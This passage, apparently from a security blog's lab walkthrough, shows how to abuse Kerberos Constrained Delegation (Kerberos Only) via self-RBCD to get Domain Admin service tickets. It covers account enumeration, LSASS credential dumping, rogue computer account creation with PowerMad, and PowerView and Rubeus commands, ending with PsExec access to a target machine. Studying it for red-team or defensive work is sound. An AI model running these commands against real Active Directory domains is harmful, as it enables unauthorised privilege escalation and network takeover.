4. The attacker uses [this TGS Ticket (belonging to an administrative domain account)](#61) as "[evidence](./demystify_kerberos_delegation.md#300)" that an administrative account has logged onto the machine with Kerberos Only enabled, consequently, analogous to an [Abuse Protocol Transition](#abuse-protocol-transition), by impersonating the machine with Kerberos Only enabled the attacker could invoke S4UProxy and insert this TGS Ticket into the "additional-ticket" field to receive from the KDC a TGS Ticket (again belonging to an administrative domain account) valid to authenticate to the computer that the Kerberos Only machine is authorized to access on behalf of the Client (indicated in the "[msds-allowedtodelegateto" flag](./demystify_kerberos_delegation.md#298)); furthermore, analogous to Abuse Protocol Transition, the attacker can choose to modify the SPN field of the received TGS Ticket.

Knowing this information we draw the following conclusion.

**If an attacker compromises a Service Account with "[Constrained Delegation (Kerberos Only)](./demystify_kerberos_delegation.md#constrained-delegation-kerberos-only)" enabled, so in most scenarios a Computer Account (usually by compromising the related machine), the attacker could therefore obtain a TGS Ticket belonging to ANY domain account and valid to access ANY ([typically](#4)) Back-End service which the compromised machine is authorized to access on behalf of the Client (indicated in the "[msds-allowedtodelegateto" flag](./demystify_kerberos_delegation.md#298)).**

## **Abuse Kerberos Only (Computer) - Windows**

In this scenario we will see how to exploit an Abuse Kerberos Only from a Windows machine.

1. **Identify which Service Accounts have "Constrained Delegation (Kerberos Only)" enabled (in this scenario we are looking for Computer Accounts that act as Service Accounts)**

    There are different methods to identify which Service Accounts have "Constrained Delegation (Kerberos Only)"; on Windows it is possible to perform targeted LDAP queries using Powershell:

    ```
    PS C:\>
        $searcher = New-Object DirectoryServices.DirectorySearcher
        $searcher.Filter = "(&(objectClass=computer)(msDS-AllowedToDelegateTo=*))"
        $searcher.FindAll() | ForEach-Object {
            $_.Properties['name']
    }
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/60.png" position="center" style="border-radius: 8px;">}}

    <span id=41>

    As you can notice, the Computer Account THEPUNISHER\$ has [Constrained Delegation (Kerberos Only)](./demystify_kerberos_delegation.md#constrained-delegation-kerberos-only) enabled; specifically, this account and therefore ALL services running under it will be able to authenticate on behalf of the Client exclusively to the SPN "HTTP/SPIDERMAN", so the HTTP service of the SPIDERMAN machine.

    In fact, inspecting via ADUC the "Delegation" tab of the THEPUNISHER Computer, we will find this configuration.

    {{< image src="/demystify_kerberos_delegation_attacks/61.png" position="center" style="border-radius: 8px;">}}

2. **The attacker compromises the Service Account with Constrained Delegation (Kerberos Only) enabled.**

    In this scenario, the attacker managed to authenticate with administrative permissions on the THEPUNISHER machine and, by dumping LSASS, obtained the credentials of the THEPUNISHER\$ Computer Account, so, the Service Account with Constrained Delegation (Kerberos Only) enabled.

    {{< image src="/demystify_kerberos_delegation_attacks/62.png" position="center" style="border-radius: 8px;">}}
<span id=27>

3. **The attacker creates a "Computer Account" within the domain.**

    [As already told](#12), the attacker needs to control an account with a configured SPN, as it can be used to invoke the S4U extensions and exploit the RBCD that we will configure later.

    Since Computer Accounts have an SPN configured by default, the attacker will aim to compromise one to then use it; among the various methods, the most common is to exploit a feature present by default in every domain.

    The domain has an attribute named "MS-DS-Machine-Account-Quota" that regulates how many Computer Accounts a non-privileged user (usually a Computer Account & a traditional domain user) can create within the domain; by default this value is 10; consequently, if this value is >=1, the attacker could create an arbitrary "Computer Account".

    Below is the command that checks the value present in the "MS-DS-Machine-Account-Quota" attribute:

    ```
    PS C:\> Get-ADObject `
        -Identity ((Get-ADDomain).distinguishedname) `
        -Properties ms-DS-MachineAccountQuo
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/63.png" position="center" style="border-radius: 8px;">}}

    Since the value is >=1, we can create an arbitrary "Computer Account"; in a Windows context, we can use the "PowerMad" tool, specifically executing the following command:

    ```
    PS C:\> New-MachineAccount -MachineAccount <ComputerAccount_Name> -Password $(ConvertTo-SecureString "<ComputerAccount_Password>" -AsPlainText -Force)
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/64.png" position="center" style="border-radius: 8px;">}}

    As you can see, following the command a new arbitrary Computer Account has been created.

    Creating a "Computer Account" is equivalent to creating a "Computer" type object within the domain; in fact, inspecting the objects via ADUC we will find the "Computer" object named EvilComputer (which will contain its related Computer Account EvilComputer\$).

    {{< image src="/demystify_kerberos_delegation_attacks/65.png" position="center" style="border-radius: 8px;">}}

<span id=36>

4. **The attacker, impersonating the user "THEPUNISHER\$" (Service Account with Constrained Delegation  -Kerberos Only), populates their own "msDS-AllowedToActOnBehalfOfOtherIdentity" attribute with the value of the "EvilComputer\$" Computer Account previously created; in this way, the attacker has forced a malicious Self RBCD.**

    As already mentioned, by default every Computer Account has the permissions to edit its own "[ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)" property; consequently, an attacker, after compromising a Service Account of the Computer Account type with Constrained Delegation (Kerberos Only) enabled, could force an RBCD ot the account itself.

    > Microsoft seems to have patched this behavior in August / September 2022.

    In our example, after compromising the THEPUNISHER\$ Computer Account (Service Account with Constrained Delegation - Kerberos Only), the attacker impersonates it and self-populates the "msDS-AllowedToActOnBehalfOfOtherIdentity" property with the value "EvilComputer\$", so, with the [previously](#27) created Computer Account.

    To do this in a Windows context, it is necessary to perform this action having imported the TGT Ticket of the THEPUNISHER\$ Computer Account into memory (in order to impersonate it); consequently, to avoid DoS we invoke a Sacrificial Process.  

    ```
    C:> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/66.png" position="center" style="border-radius: 8px;">}}
    
    <span id=29>

    Then we execute the following Rubeus command within the Sacrificial Process which will retrieve and cache locally a Ticket TGT of the THEPUNISHER$ users.

    ```
    C:\> .\Rubeus.exe asktgt /user:<Computer_Account_KerberosOnly> /rc4:<Computer_Account_KerberosOnly> /domain:<DOMAIN> /nowrap /ptt
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/67.png" position="center" style="border-radius: 8px;">}}

    After this, start PowerShell (so type "powershell" inside the Sacrificial Process) and then execute the Self RBCD configuration with the following commands (PowerView is required):

    - Retrieve the SID of the previously created Computer Account
        ```
        PS C:\> $ComputerSid = Get-DomainComputer <Computer_Account_Creato> -Properties objectsid | Select -Expand objectsid 
        ```
    > It is necessary to specify the Computer and not the Computer Account to avoid an error in this step, so you can write, for example, EvilComputer but not EvilComputer\$.

    - Create the value that will be inserted into the "msDS-AllowedToActOnBehalfOfOtherIdentity" parameter; specifically, the syntax ([SDDL](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)) in raw binary format will be used

        ```
        PS C:\Tools> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))" 
        PS C:\Tools> $SDBytes = New-Object byte[] ($SD.BinaryLength) 
        PS C:\Tools> $SD.GetBinaryForm($SDBytes, 0) 
        ```
    
    - Using PowerView, the attacker modifies the "msDS-AllowedToActOnBehalfOfOtherIdentity" attribute of the THEPUNISHER machine with the value of the previously created "EvilComputer\$" Computer Account, which is represented by the value previously constructed; this modification action will be performed while impersonating the THEPUNISHER\$ Computer Account ([as we have the related cached TGT Ticket](#29)).

        ```
        PS C:\Tools> Get-DomainComputer <target_computer>.<domain>.<domain> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
        ```

    Below is the execution of all the commands just described:

    {{< image src="/demystify_kerberos_delegation_attacks/68.png" position="center" style="border-radius: 8px;">}}

    With these commands the attacker, impersonating the account "THEPUNISHER\$", populated the "msDS-AllowedToActOnBehalfOfOtherIdentity" attribute of the machine itself with the value of the [previously](#27) created Computer Account "EvilComputer\$", in this way the attacker forced a Self RBCD on the Service Account THEPUNISHER\$ (which is still configured ALSO with [Constrained Delegation Kerberos Only](./demystify_kerberos_delegation.md#constrained-delegation-kerberos-only), in fact it still has the [msds-allowedtodelegateto flag](./demystify_kerberos_delegation.md#298) [configured](#30)).

    Indeed, if we now inspect the "msDS-AllowedToActOnBehalfOfOtherIdentity" attribute of the THEPUNISHER machine we can see that:

    1. via ADUC it is noticeable that a value with a dedicated syntax is actually present (which in reality represents the EvilComputer\$ Computer Account).
    <br>
    <br>
    <span id=30>
    {{< image src="/demystify_kerberos_delegation_attacks/69.png" position="center" style="border-radius: 8px;">}}
    
    2. via "Get-ADComputer" (requires RSAT) it is noticeable that the value "MARVEL\EvilComputer\$" is actually present.
    <br>
    <br>
    {{< image src="/demystify_kerberos_delegation_attacks/70.png" position="center" style="border-radius: 8px;">}}

<span id=34>

5. **The attacker, now that they have configured a malicious RBCD, so, it have populated the "msDS-AllowedToActOnBehalfOfOtherIdentity" attribute of the machine THEPUNISHER\$ with the value of the Computer Account "EvilComputer\$", can impersonate that account to invoke the ["S4U2Self" & "S4U2Proxy"](./demystify_kerberos_delegation.md#100) extensions (having at least 1 SPN configured it is able to do so) and thus ([thanks to the previously made malicious configuration - "Self-RBCD"](#36)) obtain a TGS Ticket belonging to a Domain Admin account valid to access ANY service hosted on the THEPUNISHER machine (so the machine with Kerberos Only already compromised by the attacker); in the [next phase](#37) we'll use this TGS Ticket as an "Additional-Ticket" to invoke S4U2Proxy again.**

    Since performing this action requires knowing the RC4 Key (NT Hash) or other types of secrets of the "EvilComputer\$" Computer Account, we can produce them by feeding Rubeus the related password in plaintext with the following command:

    ```
    C:\> PS C:\Tools> .\Rubeus.exe hash /password:<ComputerAccount_Created_Password> /user:<ComputerAccount_Created> /domain:<domain>
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/71.png" position="center" style="border-radius: 8px;">}}

    Inside the Sacrifical Process previously created execute the following Rubeus command:

    ```
    C:\> .\Rubeus.exe s4u /user:<Created_Computer_Account> /rc4:<Created_Computer_Account_RC4Key> /impersonateuser:<User_To_Impersonate> /msdsspn:<Desired_SPN_related_to_the_ComputerAccount_with_RBCD_configurated> /nowrap
    ```

    > Unlike in the Abuse Protocol Transition context where the "/msdsspn" parameter was populated exclusively with the SPN present in the "msds-allowedtodelegateto" property, in the Abuse Kerberos Only context it must be populated with any arbitrary SPN chosen by the attacker that has the THEPUNISHER\$ Computer Account as its Service Account (for example CIFS/THEPUNISHER), everything will work because the KDC will use the RBCD previously configured.

    <span id=57>

    1. **Rubeus sent a "[KRB\_AS\_REQ](./not_so_brief_overview_about_kerberos.md#39)" to obtain the TGT ticket of the EvilComputer\$ Computer Account, information necessary to invoke [next](#39) the "KRB\_TGS\_REQ (S4USelf)"**

        {{< image src="/demystify_kerberos_delegation_attacks/72.png" position="center" style="border-radius: 8px;">}}

    <span id=39>

    2. **Rubeus, now that it has the TGT Ticket of the Computer Account "EvilComputer\$", sends a "[KRB\_TGS\_REQ (S4USelf) Request](./demystify_kerberos_delegation.md#302)" to obtain a corresponding [KRB\_TGS\_REP (S4U2Self) Response](./demystify_kerberos_delegation.md#303) containing a TGS Ticket belonging to the account "MARVEL\Administrator" (Domain Admin) valid for the [services](./demystify_kerberos_delegation.md#100) executed with the account "EvilComputer\$" (in our scenario this Computer Account "EvilComputer" DOES NOT run services, that said, this actions will only be used to conduct the [Abuse Kerberos Only](#abuse-kerberos-only-computer---windows)).**
    
        {{< image src="/demystify_kerberos_delegation_attacks/73.png" position="center" style="border-radius: 8px;">}}
    
        To analyze the process in detail, [re-read this section](#34).

    <span id=35>

    > This Ticket TGS will be issued with the [FORWARDABLE flag at 1](#13) (briefly: because "EvilComputer$" does NOT have "Kerberos Only enabled")
    
    <span id=33>

    3. **Rubeus now that it has the TGS Ticket (belonging to the user MARVEL\Administrator) valid for [services](./demystify_kerberos_delegation.md#100) executed with the user "EvilComputer\$" ([so none](#39)), uses it to invoke a "[KRB\_TGS\_REQ (S4UProxy) Request](./demystify_kerberos_delegation.md#118)", with this procedure the KDC will verify if this TGS Ticket has the FORWARDABLE flag ([positive outcome](#35)) and if the user "EvilComputer\$" has the "msds-allowedtodelegate" flag properly configured (negative outcome), in summary, the second verification will fail since the user "EvilComputer\$" does NOT have the "msds-allowedtodelegate" flag at all and consequently the KDC will switch to Kerberos Delegation RBCD; for this reason, the KDC will verify if the Service Account THEPUNISHER\$ possesses the "ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity" flag containing the value of "EvilComputer\$" (positive outcome), since this verification will be positive ([the attacker previously performed this configuration - A.K.A Self-RBCD](#36)), the KDC will issue a TGS Ticket (belonging to the user MARVEL\Administrator) valid for [services](./demystify_kerberos_delegation.md#100) executed with the user "THEPUNISHER\$" (so the machine with Kerberos Only already compromised by the attacker); finally, this TGS Ticket will be subsequently used in the [continuation of the attack](#37).**

        {{< image src="/demystify_kerberos_delegation_attacks/74.png" position="center" style="border-radius: 8px;">}}

        To analyze the process in detail, [re-read this section](#16).

        <span id=39>

        {{< image src="/demystify_kerberos_delegation_attacks/75.png" position="center" style="border-radius: 8px;">}}

    > This Ticket TGS will be issued with the FORWARDABLE flag at 1.

<span id=63>
<span id=37>

6. **The attacker could use the [previously](#33) obtained TGS Ticket** (belonging to Domain Admin & valid for [services](./demystify_kerberos_delegation.md#100) executed with the user "THEPUNISHER\$", so the machine with Kerberos Only), **as "[evidence](./demystify_kerberos_delegation.md#305)" that the Domain Admin user "MARVEL\Administrator" logged onto the THEPUNISHER machine, consequently, the attacker, analogous to an [Abuse Protocol Transition](#abuse-protocol-transition), can invoke [S4UProxy](./demystify_kerberos_delegation.md#118) and insert that TGS Ticket inside the "additional-ticket" field** (traditionally in a Protocol Transition this field is dedicated to the TGS Ticket issued in the S4USelf Response but nothing prevents inserting any other TGS Ticket like this one received in an ["malicious" S4UProxy](#33)) **in order to receive from the KDC a TGS Ticket (belonging to the Domain Admin user MARVEL\Administrator) valid to authenticate to the computer (HTTP/SPIDERMAN) that the Kerberos Only machine (THEPUNISHER) is authorized to access on behalf of the Client (indicated in the "msds-allowedtodelegateto" flag - [1](./demystify_kerberos_delegation.md#298), [2](#41)); furthermore, in this scenario the attacker decides to [replace](#4) the SPN "HTTP/SPIDERMAN" with the SPN "CIFS/SPIDERMAN" thereby managing to authenticate via PsExec to the SPIDERMAN machine.**

    To do this run the following Rubeus command inside the previously created Sacrificial Process:

    <span id=42>

    ```
    C:> .\Rubeus.exe s4u /tgs:<TicketTGS_received_earlier_in_the_S4UProxyResponse) /user:<Service_Account_with_KerberosOnly> /rc4:<Service_Account_with_KerberosOnly_NTHash> /msdsspn:<SPN_within_in_msds-allowedtodelegateto> /altservice:<service> /nowrap /ptt
    ```

    > If desired, the /altservice parameter must be populated exclusively with the requested service and NOT the entire SPN, for example if we want the SPN of the TGS Ticket to be changed to CIFS it will be necessary to write only "CIFS" and not "CIFS/<hostname>", otherwise the received TGS Ticket will NOT be valid.

    Let's analyze ALL the operations performed by Rubeus.
    <span id=38>

    1. **Rubeus sent a "[KRB\_AS\_REQ](./not_so_brief_overview_about_kerberos.md#39)" to obtain the TGT Ticket of the Computer Account THEPUNISHER\$, [information necessary](./demystify_kerberos_delegation.md#109) to invoke the ["KRB\_TGS\_REQ (S4UProxy)"](./demystify_kerberos_delegation.md#118)**

        {{< image src="/demystify_kerberos_delegation_attacks/76.png" position="center" style="border-radius: 8px;">}}

        {{< image src="/demystify_kerberos_delegation_attacks/77.png" position="center" style="border-radius: 8px;">}}

    2. **Rubeus now that it has the [TGT Ticket of the Computer Account THEPUNISHER\$](#38) and the TGS Ticket (belonging to the user MARVEL\Administrator) valid for the CIFS service on the THEPUNISHER\$ machine ([so, the one received in the previous S4UProxy Response](#39)), will be able to use this Ticket as "evidence" and therefore insert it inside the "Additional-Ticket" field in a new "[S4UProxy Request](./demystify_kerberos_delegation.md#118)", in this way the attacker will obtain a TGS Ticket (still belonging to the user MARVEL\Administrator) valid for the HTTP service exposed on the SPIDERMAN machine (HTTP/SPIDERMAN), finally, Rubeus will change the HTTP service to the CIFS service, thus obtaining a TGS Ticket (still belonging to the user MARVEL\Administrator) valid for the CIFS service exposed on the SPIDERMAN machine.**

        {{< image src="/demystify_kerberos_delegation_attacks/78.png" position="center" style="border-radius: 8px;">}}

        As we can see, Rubeus sends a ["KRB\_TGS\_REQ (S4UProxy)"](./demystify_kerberos_delegation.md#118), analyzing the content of the packet it can be noted that: 1) Inside the "Additional Ticket" field [the TGS Ticket previously received in the "S4UProxy Response" is indeed sent](#39) ([so the Ticket inserted by the attacker in the /ticket parameter)](#42) 2) The SPN that points to the service the compromised machine (Computer Account THEPUNISHER\$) is authorized to access on behalf of the Client (indicated in the "msds-allowedtodelegateto" flag ([1](./demystify_kerberos_delegation.md#298), [2](#41)), in fact the SPN "HTTP/SPIDERMAN.MARVEL.local" is present.

        <span id=40>

        {{< image src="/demystify_kerberos_delegation_attacks/79.png" position="center" style="border-radius: 8px;">}}

        The KDC [verifies](./demystify_kerberos_delegation.md#51) if the TGS Ticket received inside the "additional-tickets" field (besides being valid) has the "FORWARDABLE" flag set to "1" (outcome positive - [1](#39), [2](#40))& that inside the "[msds-allowedtodelegateto" flag](./demystify_kerberos_delegation.md#298) parameter of the Service Account THEPUNISHER\$ the requested service is present, in this case "HTTP/SPIDERMAN.MARVEL.local" ([outcome positive](#41)), since the outcome is positive for both checks, the KDC issues a TGS Ticket (belonging to the user MARVEL\Administrator) valid for the HTTP service exposed on the SPIDERMAN machine (like any other valid TGS Ticket, this will also have the "FORWARDABLE" flag set to "1").

        {{< image src="/demystify_kerberos_delegation_attacks/80.png" position="center" style="border-radius: 8px;">}}

    Finally, Rubeus will [modify](#4) the SPN field of the received TGS Ticket, replacing the HTTP service with the desired CIFS service, in this way the output TGS Ticket (belonging to the user MARVEL\Administrator) will have the SPN "CIFS/SPIDERMAN" and will therefore be valid for the CIFS service exposed on the SPIDERMAN machine, after this Rubeus imports this Kerberos Ticket into memory.

    > If the attacker does NOT want to replace the service of the TGS Ticket obtained via S4UProxy, they will simply NOT insert the ["altservice" parameter](#42), consequently, in this context we will obtain a TGS Ticket (belonging to the user MARVEL\Administrator) valid for the HTTP service present on the SPIDERMAN machine ([usefull for a potential WinRM Service](#48) running and present on the SPIDERMAN machine).

As you can see, following the Rubeus command we will have cached in memory a TGS Ticket belonging to the "Administrator" user valid for the CIFS service of the SPIDERMAN machine, in fact, performing a Network Logon with "PsExec" the OS will retrieve the cached TGS Ticket and use it to authenticate; in this way the attacker has managed to authenticate with administrative privileges to the SPIDERMAN machine.

{{< image src="/demystify_kerberos_delegation_attacks/81.png" position="center" style="border-radius: 8px;">}}

> The LogonID in this screenshot is different from that of the previously indicated Sacrificial Process simply because I have repeated this lab several times.

> If you encounter an authentication error, try re-running the command by inserting the "msdsspn" parameter with a value that does not have the domain suffix, changing from "SPIDERMAN.MARVEL.local" to "SPIDERMAN"; in both cases it should still work since both values are present within the msds-allowedtodelegateto property; also make sure to use the same domain notation in "msdsspn" as in the PsExec command (in this case), so if, for example, I request a TGS Ticket to access the SPIDERMAN.MARVEL.local machine, use the same wording to connect via PsExec.

> An attacker, after performing the attack, could partially restore the situation (since the created Computer Account cannot be deleted [unless](https://web.archive.org/web/20250324161821/https://www.fortalicesolutions.com/posts/hunting-resource-based-constrained-delegation-in-active-directory) there are administrative permissions on the domain) to the pre-attack state; for this, see [this section](#43).

## **Abuse Kerberos Only (User) - Windows**

[As already said](#70), although it is stated that exclusively Computer Accounts can edit their property "ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity", from my labs this also turns out to be true for traditional domain users, consequently the [Abuse Kerberos Only](#abuse-kerberos-only) attack can also be carried out in this scenario, consequently if we identify a Service Account of type "User" (traditional domain user) with the "[Constrained Delegation (Kerberos Only)](#abuse-kerberos-only)" enabled (a rarer scenario compared to the Computer counterpart) it is possible to perform the [same steps previously seen](#abuse-kerberos-only-computer---windows) to abuse this configuration.

If an attacker compromises a Service Account with the "[Constrained Delegation (Kerberos Only)](#abuse-kerberos-only)" enabled, so in this example a traditional domain user, the attacker could therefore obtain a TGS Ticket belonging to ANY domain user and valid to access ANY ([usually](#1)) Back-End service for which the compromised Service Account (domain user) is authorized to access on behalf of the Client (indicated in flag "msds-allowedtodelegateto").

We therefore re-execute the same steps previously seen:

1. **Identify which Service Accounts have the "Constrained Delegation (Kerberos Only)" enabled (in this scenario we are looking for traditional domain users acting as Service Accounts)**

    ```
    PS C:\>
    $searcher = New-Object DirectoryServices.DirectorySearcher
    $searcher.Filter = "(&(objectClass=user)(msDS-AllowedToDelegateTo=*))"
    $searcher.FindAll() | ForEach-Object {
        $_.Properties['name']
    }
    ```
    {{< image src="/demystify_kerberos_delegation_attacks/82.png" position="center" style="border-radius: 8px;">}}
    
    <span id=79>

    As you can notice, the traditional domain user MARVEL\userz has [Constrained Delegation (Kerberos Only)](#abuse-kerberos-only) enabled, specifically, this user and therefore ALL services started with it (in this case the Service Account "User" has the SPN LDAP/WORKSTATION02 and therefore will run the LDAP service on that machine; the fact that this machine does NOT exist in my lab is irrelevant for the purpose of the exploitation) will be able to authenticate on behalf of the Client exclusively towards the SPN "HTTP/SPIDERMAN", so to the HTTP service of the machine SPIDERMAN.

    In fact, inspecting via ADUC the "Delegation" tab of the domain user "MARVEL\userz" we will find this configuration.

    <span id=81>

    {{< image src="/demystify_kerberos_delegation_attacks/83.png" position="center" style="border-radius: 8px;">}}

- **(2 & 3) For simplicity, we do not show points 2 (Compromise of the Service Account MARVEL\userz) and 3 (the attacker creates a Computer Account within the domain, in this example we will use the EvilComputer$ user created [previously](#abuse-kerberos-only-computer---windows))**
<span id=72>

4. **The attacker, impersonating the user "MARVEL\userz" populates their "msDS-AllowedToActOnBehalfOfOtherIdentity" attribute with the value of the Computer Account "EvilComputer$" previously created, in this way the attacker has forced a malicious Self RBCD.**

    {{< image src="/demystify_kerberos_delegation_attacks/84.png" position="center" style="border-radius: 8px;">}}

5. **The attacker now, having configured a malicious RBCD, so having populated the "msDS-AllowedToActOnBehalfOfOtherIdentity" attribute of the domain user "MARVEL\userz" with the value of the Computer Account "EvilComputer$", can impersonate the latter to invoke the S4U2Self & S4U2Proxy extensions (having at least 1 SPN configured allows them to do so) and thus obtain ([thanks to the previously made malicious configuration - "Self-RBCD"](#72)) a TGS Ticket belonging to a Domain Admin user valid to access ANY service (in this case exclusively the LDAP service on the machine WORKSTATION02 - [which does not exist but in my home lab it doesn't care](#79)) hosted by the Service Account "MARVEL\userz" (so the Service Account already compromised with Kerberos Only enabled), this TGS Ticket will [subsequently](#80) be used as an "Additional-Ticket" to invoke S4UProxy again.**

    > Unlike the Abuse Protocol Transition context where the "/msdsspn" parameter was populated exclusively with the SPN present in the "msds-allowedtodelegateto" property, in the Abuse Kerberos Only context it must be populated with any SPN chosen by the attacker that has the domain user "MARVEL\userz" as the Service Account (since in our example the Service Account MARVEL\userz has exclusively the SPN string LDAP\Workstation02, it will be necessary to insert this value), all of this will work because the KDC will use the previously configured RBCD.


    {{< image src="/demystify_kerberos_delegation_attacks/85.png" position="center" style="border-radius: 8px;">}}

<span id=80>

6. **[In summary](#63), similarly to an [Abuse Protocol Transition](#abuse-protocol-transition), the attacker now it's able to obtain a TGS Ticket (of a Domain Admin) valid to authenticate to the HTTP service hosted on the machine SPIDERMAN (so, to the computer for which the Service Account with Kerberos Only "MARVEL\userz" has permissions to access on behalf of the Client through the ["msds-allowedtodelegateto" flag](#81)), subsequently, in this scenario, the attacker will decide to [modify](#4) the HTTP service with the CIFS service, thus making the TGS Ticket valid for authentication to the SMB service.**

    {{< image src="/demystify_kerberos_delegation_attacks/86.png" position="center" style="border-radius: 8px;">}}

As you can notice, following the Rubeus command we will have cached in memory a TGS Ticket belonging to the user "Administrator" valid for the CIFS service of the machine SPIDERMAN, in fact, performing a Network Logon with "PsExec" the OS will retrieve the cached TGS Ticket and use it to perform the authentication; in this way the attacker has managed to authenticate with administrative permissions to the machine SPIDERMAN.

{{< image src="/demystify_kerberos_delegation_attacks/87.png" position="center" style="border-radius: 8px;">}}

## **Abuse Kerberos Only - Detect & Mitigation**

**Detect**

Same as indicated in [Abuse RBCD via DACL - Detect & Mitigation](#abuse-rbcd-via-dacl---detect--mitigation)

**Mitigation**

Same as indicated in [Abuse RBCD via DACL - Detect & Mitigation](#abuse-rbcd-via-dacl---detect--mitigation)

## **Outro**

If you have made it into this hell, congratulations, you really deserve it! ​😁​

Although this is an extremely long post, i have detailed the most "common" attacks that Kerberos Delegation can offer, that said, now you have an extremely solid foundation to fall into the rabbit hole on your own, so, if you are so crazy to continue, start by looking at the articles listed in the references.

## **References**

- https://hadess.io/pwning-the-domain-kerberos-delegation/
- https://medium.com/@offsecdeer/user-based-unconstrained-delegation-and-spn-jacking-29b916d1ff25
- https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5
- https://labs.lares.com/fear-kerberos-pt4/
- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html